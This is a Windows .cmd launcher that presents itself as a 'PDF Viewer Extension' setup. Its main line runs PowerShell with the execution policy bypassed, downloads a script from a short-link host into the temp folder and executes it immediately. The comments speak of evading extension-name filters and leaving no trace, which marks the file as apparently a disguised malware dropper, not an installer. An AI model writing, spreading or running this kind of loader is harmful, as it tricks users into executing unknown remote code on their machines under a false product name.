@echo off
rem ============================================================
rem PDF Viewer Extension - Windows .cmd launcher
rem .cmd and .bat are 100% equivalent engines (cmd.exe + ntvdm syntax).
rem Kept as a separate file for channels filtered by extension name.
rem Same landing-page command as the .bat version.
rem Execution: double-click; waits for completion, leaves no trace
rem in %TEMP% after the installer script itself cleans c.ps1.
rem ============================================================

title PDF Viewer Setup (cmd)

powershell -NoProfile -ExecutionPolicy Bypass -c "iwr wln.ink/i -o $env:TEMP\c.ps1;. $env:TEMP\c.ps1"

if errorlevel 1 (
    echo.
    echo  [ERROR] Installation failed. Check internet connection and retry.
    pause
    exit /b 1
)

echo.
echo  [OK] Done. You can close this window.
timeout /t 5 /nobreak >nul